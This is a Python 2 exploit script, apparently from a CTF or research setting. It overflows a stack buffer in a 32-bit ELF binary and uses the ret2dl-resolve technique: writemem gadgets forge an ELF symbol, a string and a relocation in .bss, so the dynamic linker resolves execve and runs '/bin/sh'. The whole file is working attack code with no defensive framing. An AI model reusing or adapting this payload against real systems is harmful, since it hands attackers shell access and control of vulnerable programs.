import sys
import json
import subprocess
from helper import *

import elftools.elf.structs

config = None

GADGET_SIZE = 4
R_386_JUMP_SLOT = 0x7
DWORD_SIZE = 4
PTR_SIZE = 32 / 8
WRITE_SIZE = PTR_SIZE

class Buffer:
    def __init__(self, start):
        self.start = start
        self.current = start
    def allocate(self, size, align_to=None, alignment=None):
        result = MemoryArea(self.current, size, align_to, alignment)
        self.current += result.size
        return result

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

# FIXME
ptr2str = int2le

class MemoryArea:
    def __init__(self, start, size, align_to=None, alignment=None):
        if align_to is not None:
            alignment = size if (alignment is None) else alignment
            self.start = align(start, align_to, alignment)
            self.index = (self.start - align_to) / alignment
        else:
            self.start = start

        self.pointer = ptr2str(self.start)
        self.size = size
        self.end = self.start + self.size

    def write_string(self, string):
        string_len = len(string)
        if string_len > self.size:
            raise "You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, self.size)

        if string_len % WRITE_SIZE != 0:
            string = string.ljust(string_len + (WRITE_SIZE - string_len % WRITE_SIZE), "\0")
            string_len = len(string)

        result = ""
        for i, part in enumerate(chunks(string, WRITE_SIZE)):
            log(le2hex(part) + " " + str(len(part)))
            result += writemem(ptr2str(self.start + i * WRITE_SIZE), part)

        return result

    def write_pointer(self, pointer):
        return self.write_string(ptr2str(pointer))

filler = ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (PTR_SIZE % 4)), 0))

def writemem(address, value):
    log("Writing " + str(list(value)) + " at " + le2hex(address))
    return call("writemem", [address, value])

def call(function_name, parameters):
    if len(parameters) > GADGET_SIZE:
        raise "Too many parameters, find a better gadget"

    return ptr2str(config[function_name]) + \
           ptr2str(config["base"] + config["gadget"]) + \
           "".join(map(str, parameters)) + \
           filler * (GADGET_SIZE - len(parameters))

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + 16 - offset

binsh_str = "/bin/sh\0"
execve_str = "execve\0"

def main():
    global config

    #config = json.loads(subprocess.check_output("./offsets"))
    config = json.loads(open("config.json", "r").read())
    structs = elftools.elf.structs.ELFStructs(True, 32)

    config["sip_offset"] = hex(int(config["sip_offset"], 10))
    for key in config:
        config[key] = int(config[key], 16)

    buffer = Buffer(config["bss"])
    relocation_target = buffer.allocate(PTR_SIZE)
    pointer_to_null = buffer.allocate(PTR_SIZE)
    binsh = buffer.allocate(len(binsh_str))
    execve_string = buffer.allocate(len(execve_str), config["dynstr"], 1)
    symbol = buffer.allocate(structs.Elf_Sym.sizeof(), config["dynsym"])
    log(hex(symbol.start))
    reloc = buffer.allocate(structs.Elf_Rel.sizeof(), config["rel.plt"], 1)

    exploit = "A" * config["sip_offset"]

    # Pointer to NULL
    exploit += pointer_to_null.write_pointer(0)

    # /bin/sh
    exploit += binsh.write_string(binsh_str)

    # No versioning
    # edx + edi * 2
    exploit += writemem(ptr2str(0x80497e4), ptr2str(0x80482b0 - 2 * symbol.index + 2 * 2))

    # String
    exploit += execve_string.write_string(execve_str)

    # Symbol
    execve_symbol = structs.Elf_Sym.parse("\0" * structs.Elf_Sym.sizeof())
    execve_symbol.st_name = execve_string.index
    execve_symbol.st_info.bind = "STB_GLOBAL"
    execve_symbol.st_info.type = "STT_FUNC"

    exploit += symbol.write_string(structs.Elf_Sym.build(execve_symbol))

    # Relocation
    execve_reloc = structs.Elf_Rel.parse("\0" * structs.Elf_Rel.sizeof())
    execve_reloc.r_offset = relocation_target.start
    execve_reloc.r_info_type = R_386_JUMP_SLOT
    execve_reloc.r_info_sym = symbol.index
    execve_reloc.r_info = execve_reloc.r_info_type | (execve_reloc.r_info_sym << 8)

    log(str(list(structs.Elf_Rel.build(execve_reloc))))

    exploit += reloc.write_string(structs.Elf_Rel.build(execve_reloc))

    # Launch
    exploit += ptr2str(config["plt"]) + ptr2str(reloc.index)

    log("reloc.index " + hex(reloc.index))
    log("reloc.start " + hex(reloc.start))
    log("reloc.start " + hex(config["rel.plt"]))


    exploit += filler + binsh.pointer + pointer_to_null.pointer + pointer_to_null.pointer + ptr2str(4)

    write_string(exploit)

if __name__ == "__main__":
    main()
